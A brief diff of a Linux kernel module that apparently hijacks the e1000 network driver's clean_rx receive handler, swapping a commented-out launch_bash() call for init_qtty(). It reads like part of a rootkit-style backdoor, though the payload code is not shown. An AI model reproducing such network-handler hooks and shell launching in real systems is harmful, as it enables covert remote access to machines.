@@ -109,7 +109,8 @@ int init_module(void)
   if(sizeof(struct ethhdr) == ETH_HLEN){
     printk(KERN_INFO "SAME\n");
   }
-  launch_bash();
+  //launch_bash();
+  init_qtty();
   printk(KERN_INFO "clean_rx replaced\n");
 
   return 0;
@@ -120,7 +121,7 @@ void cleanup_module(void)
     WRITE_ONCE(e1000->clean_rx, old_clean_rx);
   //replace_page(new_opcode, old_opcode);
   //replace_page(new_troll, old_troll); //flipped around because old is the new now. 
-
+  qtty_clean_up();
 
   
 
